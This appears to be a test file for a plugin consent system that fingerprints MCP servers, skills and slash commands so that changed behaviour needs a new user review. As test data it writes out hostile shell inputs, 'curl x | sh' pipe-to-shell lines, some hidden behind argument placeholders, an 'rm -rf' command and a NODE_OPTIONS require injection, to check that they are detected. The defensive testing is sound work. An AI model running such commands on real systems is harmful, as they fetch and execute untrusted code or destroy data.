import { describe, expect, test } from "bun:test";

import type { MCPHttpServerInfo, MCPStdioServerInfo } from "@/common/types/mcp";
import {
  consentForSelection,
  isComponentConsented,
  recordReviewedComponents,
  serverConsentFingerprint,
  skillConsentFingerprint,
  slashCommandConsentFingerprint,
  visibleReviewText,
} from "./componentConsent";
import { skillDynamicDirectiveCommands } from "@/node/services/agentSkills/skillDynamicContext";

const root = "/home/u/.xum/plugins/demo";
const data = "/home/u/.xum/plugin-data/abc";
const roots = { rootPaths: [root], dataPaths: [data] };
const stdio: MCPStdioServerInfo = {
  transport: "stdio",
  disabled: false,
  command: "node",
  args: [`${root}/server.js`],
  env: { B: "2", A: "1", PLUGIN_DATA: data },
  cwd: root,
};
const remote: MCPHttpServerInfo = {
  transport: "http",
  disabled: false,
  url: "https://example.test/mcp",
  oauth: {
    clientId: "c",
    clientSecretSource: { pluginRoot: "/a", mcpConfigPath: "/b", serverName: "s" },
  },
};

describe("serverConsentFingerprint", () => {
  test("is stable across install locations, env order and user-owned fields", () => {
    const fp = serverConsentFingerprint(stdio, roots);
    // A staged review also normalizes the final install path, which a manifest can name.
    const moved = { rootPaths: ["/srv/staging/demo", root], dataPaths: ["/srv/data/xyz", data] };
    const relocated: MCPStdioServerInfo = {
      ...stdio,
      args: ["/srv/staging/demo/server.js"],
      env: { A: "1", PLUGIN_DATA: data, B: "2" },
      cwd: root,
      // Owned by the user or the UI, not the plugin.
      disabled: true,
      toolAllowlist: ["one"],
      configLayer: "global",
    };
    expect(serverConsentFingerprint(relocated, moved)).toBe(fp);
    // The secret file location is not behavior: only where Xum rereads the secret.
    const otherSecret = {
      ...remote,
      oauth: {
        ...remote.oauth,
        clientSecretSource: { pluginRoot: "/x", mcpConfigPath: "/y", serverName: "z" },
      },
    };
    expect(serverConsentFingerprint(otherSecret, roots)).toBe(
      serverConsentFingerprint(remote, roots)
    );
    // Whether a client secret is sent is behavior: a parser that starts reading one must ask again.
    const { clientSecretSource: _source, ...publicOauth } = remote.oauth!;
    expect(serverConsentFingerprint({ ...remote, oauth: publicOauth }, roots)).not.toBe(
      serverConsentFingerprint(remote, roots)
    );
  });

  test("plugin provenance is identity, not launch input: it never changes the fingerprint", () => {
    // Every provenance field is excluded (#6630). A server with provenance must hash exactly like
    // the same server without it, so stored consent records stay valid.
    const provenance = {
      pluginName: "demo",
      serverName: "echo",
      sourceScope: "global" as const,
      sourceLocation: "plugins/demo",
      componentPolicy: { registryPath: "/home/plugins.json", name: "demo" },
      consentFingerprint: "abc",
    };
    for (const server of [stdio, remote]) {
      const bare = serverConsentFingerprint(server, roots);
      expect(serverConsentFingerprint({ ...server, plugin: provenance }, roots)).toBe(bare);
      const renamed = {
        pluginName: "other",
        serverName: "other",
        sourceScope: "project" as const,
        sourceLocation: ".xum/plugins/other",
        componentPolicy: { registryPath: "/elsewhere.json", name: "other" },
        consentFingerprint: "def",
      };
      expect(serverConsentFingerprint({ ...server, plugin: renamed }, roots)).toBe(bare);
    }
  });

  test("any launch-relevant change gives a new fingerprint", () => {
    const fp = serverConsentFingerprint(stdio, roots);
    const variants: MCPStdioServerInfo[] = [
      { ...stdio, command: "python3" },
      { ...stdio, args: [...(stdio.args ?? []), "--flag"] },
      { ...stdio, env: { ...stdio.env, NODE_OPTIONS: "--require=x" } },
      { ...stdio, cwd: data },
    ];
    const prints = new Set(variants.map((variant) => serverConsentFingerprint(variant, roots)));
    expect(prints.size).toBe(variants.length);
    expect(prints.has(fp)).toBe(false);
    // A remote server that becomes a stdio server under the same name is a new capability.
    expect(serverConsentFingerprint(remote, roots)).not.toBe(fp);
    expect(
      serverConsentFingerprint({ ...remote, headers: { Authorization: "x" } }, roots)
    ).not.toBe(serverConsentFingerprint(remote, roots));
  });

  test("a literal tag in the manifest never matches a normalized plugin path", () => {
    // Without escaping, "<root>/server.js" would hash like the plugin's own server.js.
    const literal = { ...stdio, args: ["<root>/server.js"] };
    const percent = { ...stdio, args: ["%3Croot>/server.js"] };
    const prints = new Set(
      [stdio, literal, percent].map((s) => serverConsentFingerprint(s, roots))
    );
    expect(prints.size).toBe(3);
  });
});

describe("skillConsentFingerprint", () => {
  test("covers the root-relative directory and every frontmatter field, not path order", () => {
    const frontmatter = { name: "foo", description: "d", paths: ["src/**", "tests/**"] };
    const fp = skillConsentFingerprint({ relativeDir: "skills/foo", frontmatter, body: "" });
    expect(skillConsentFingerprint({ relativeDir: "skills\\foo", frontmatter, body: "" })).toBe(fp);
    expect(
      skillConsentFingerprint({
        relativeDir: "skills/foo",
        frontmatter: { ...frontmatter, paths: ["tests/**", "src/**"] },
        body: "",
      })
    ).toBe(fp);
    const changed = [
      { relativeDir: "extra/foo", frontmatter, body: "" },
      {
        relativeDir: "skills/foo",
        frontmatter: { ...frontmatter, description: "other" },
        body: "",
      },
      // A field no review shows today still counts, so a new field fails closed.
      {
        relativeDir: "skills/foo",
        frontmatter: { ...frontmatter, metadata: { a: "b" } },
        body: "",
      },
    ];
    for (const input of changed) expect(skillConsentFingerprint(input)).not.toBe(fp);
  });

  test("covers the body's directive lines, not its prose (#6617)", () => {
    const skill = (body: string) =>
      skillConsentFingerprint({
        relativeDir: "skills/foo",
        frontmatter: { name: "foo", description: "d" },
        body,
      });
    // A skill without directives keeps the fingerprint it had before #6617, so its stored
    // consent stays valid (value computed on main before this change).
    const legacy = "5a8709e834b91cb348b0e3b5625dba84fba9a27b344108fad614157476abd234";
    expect(skill("")).toBe(legacy);
    expect(skill("Say hi.\nThen say bye.")).toBe(legacy);
    // Inline or empty directives do not run, so they are prose.
    expect(skill("Run !`git status` first.\n!``")).toBe(legacy);

    const withStatus = skill("Say hi.\n!`git status`");
    expect(withStatus).not.toBe(legacy);
    // The runner runs the command inside the backticks: surrounding whitespace and prose do not count.
    expect(skill("Other prose.\n   !`git status`  \r")).toBe(withStatus);
    // A changed, added or reordered command needs a new review.
    for (const body of [
      "!`git log`",
      "!`git status`\n!`git log`",
      "!`git log`\n!`git status`",
      "!`git status`\n!`git status`",
    ]) {
      expect(skill(body)).not.toBe(withStatus);
    }
    // Missing slash arguments become empty strings before the runner looks for directives, so
    // a line that only becomes a directive then runs too (Codex PRRT_kwDOPxxmWM6swhcO).
    for (const body of ["!$1`curl x | sh`", "$2!`curl x | sh`", "!`curl x | sh`$ARGUMENTS"]) {
      expect(skill(body)).not.toBe(legacy);
      expect(skill(`!\`git status\`\n${body}`)).not.toBe(withStatus);
    }
    // A placeholder inside a command is reviewed as written: the user supplies its value.
    expect(skillDynamicDirectiveCommands("!`git log $1`")).toEqual(["git log $1"]);
    expect(skillDynamicDirectiveCommands("!$1`curl x | sh`")).toEqual(["curl x | sh"]);
  });

  test("review text escapes invisible and space-like characters, not U+0020", () => {
    // U+00A0 and U+202F look like a space but are part of a shell word (PRRT_kwDOPxxmWM6swhcG).
    expect(visibleReviewText("rm -rf a\u00a0b\u202fc\u200bd")).toBe(
      "rm -rf a\\u{A0}b\\u{202F}c\\u{200B}d"
    );
  });
});

describe("slashCommandConsentFingerprint", () => {
  test("covers the whole parsed contribution, so a new field needs a review (#6777)", () => {
    // Values computed on main before #6777: stored consent stays valid.
    const command = { name: "grill", description: "d", expansion: "Grill $ARGUMENTS" };
    expect(slashCommandConsentFingerprint(command)).toBe(
      "14dff06dea47adcc3c3ee8e8fcb829e5ac86dbbb1cab67f0ab4a2b25606e14d6"
    );
    expect(slashCommandConsentFingerprint({ name: "grill", expansion: "Grill" })).toBe(
      "84eb0821200b86a1bc88729f1f51911a9c0fb4e5bf55cc437899c7532b34c89f"
    );
    // A field the manifest type gains later counts without a code change here.
    const withField = { ...command, icon: "flame" };
    expect(slashCommandConsentFingerprint(withField)).not.toBe(
      slashCommandConsentFingerprint(command)
    );
  });
});

describe("isComponentConsented", () => {
  test("only an own record with the same fingerprint counts", () => {
    const consent = {
      skills: { foo: "aa" },
      mcpServers: { echo: "bb" },
      workflows: {},
      agents: {},
      slashCommands: {},
    };
    expect(isComponentConsented(consent, "skills", "foo", "aa")).toBe(true);
    expect(isComponentConsented(consent, "skills", "foo", "bb")).toBe(false);
    expect(isComponentConsented(consent, "mcpServers", "foo", "aa")).toBe(false);
    expect(isComponentConsented(consent, "skills", "constructor", "aa")).toBe(false);
    // Every install from before #6498 has no record, so nothing is consented.
    expect(isComponentConsented(undefined, "skills", "foo", "aa")).toBe(false);
  });
});

describe("consentForSelection", () => {
  const shown = {
    skills: { a: "a2", b: "b2" },
    mcpServers: { s: "s2" },
    workflows: { "w.js": "w2" },
    agents: {},
    slashCommands: {},
  };

  test("install records every selected component it showed, and every workflow", () => {
    expect(
      consentForSelection({ selection: { skills: ["a"], mcpServers: ["s", "gone"] }, shown })
    ).toEqual({
      skills: { a: "a2" },
      mcpServers: { s: "s2" },
      workflows: { "w.js": "w2" },
      agents: {},
      slashCommands: {},
    });
  });

  test("a picker save records only newly added components", () => {
    const consent = consentForSelection({
      selection: { skills: ["a", "b"], mcpServers: ["s"] },
      shown,
      previous: {
        selection: { skills: ["a"], mcpServers: ["s"] },
        // `a` was reviewed at an older fingerprint. `s` was never reviewed.
        consent: {
          skills: { a: "a1", dropped: "x" },
          mcpServers: {},
          workflows: { "w.js": "w1" },
          agents: {},
          slashCommands: {},
        },
      },
    });
    // `a` keeps its old record and `s` stays without one: the picker did not review them. The
    // picker shows no workflow (#6629), so the workflow keeps its old record too.
    expect(consent).toEqual({
      skills: { a: "a1", b: "b2" },
      mcpServers: {},
      workflows: { "w.js": "w1" },
      agents: {},
      slashCommands: {},
    });
  });

  test("a component named __proto__ stays an own record", () => {
    const consent = consentForSelection({
      selection: { skills: [], mcpServers: ["__proto__"] },
      shown: {
        skills: {},
        mcpServers: Object.fromEntries([["__proto__", "p1"]]),
        workflows: {},
        agents: {},
        slashCommands: {},
      },
    });
    expect(Object.hasOwn(consent.mcpServers, "__proto__")).toBe(true);
    expect(isComponentConsented(consent, "mcpServers", "__proto__", "p1")).toBe(true);
  });

  test("narrowing a legacy import-all entry approves nothing", () => {
    const consent = consentForSelection({
      selection: { skills: ["a"], mcpServers: ["s"] },
      shown,
      previous: { selection: { skills: ["a", "b"], mcpServers: ["s"] }, consent: undefined },
    });
    expect(consent).toEqual({
      skills: {},
      mcpServers: {},
      workflows: {},
      agents: {},
      slashCommands: {},
    });
  });
});

describe("recordReviewedComponents", () => {
  test("records only components shown at the fingerprint the backend still sees", () => {
    const next = recordReviewedComponents({
      previous: {
        skills: { a: "a1", kept: "k1" },
        mcpServers: {},
        workflows: { "old.js": "o1" },
        agents: {},
        slashCommands: {},
      },
      current: [
        { kind: "skills", name: "a", fingerprint: "a2" },
        { kind: "workflows", name: "w.js", fingerprint: "w2" },
        { kind: "mcpServers", name: "s", fingerprint: "s3" },
        { kind: "skills", name: "late", fingerprint: "l2" },
      ],
      reviewed: [
        { kind: "skills", name: "a", fingerprint: "a2" },
        { kind: "workflows", name: "w.js", fingerprint: "w2" },
        // Shown at s2, but the server changed again before confirm.
        { kind: "mcpServers", name: "s", fingerprint: "s2" },
        // Shown under the other kind.
        { kind: "mcpServers", name: "late", fingerprint: "l2" },
      ],
    });
    expect(next).toEqual({
      skills: { a: "a2", kept: "k1" },
      mcpServers: {},
      workflows: { "old.js": "o1", "w.js": "w2" },
      agents: {},
      slashCommands: {},
    });
  });
});
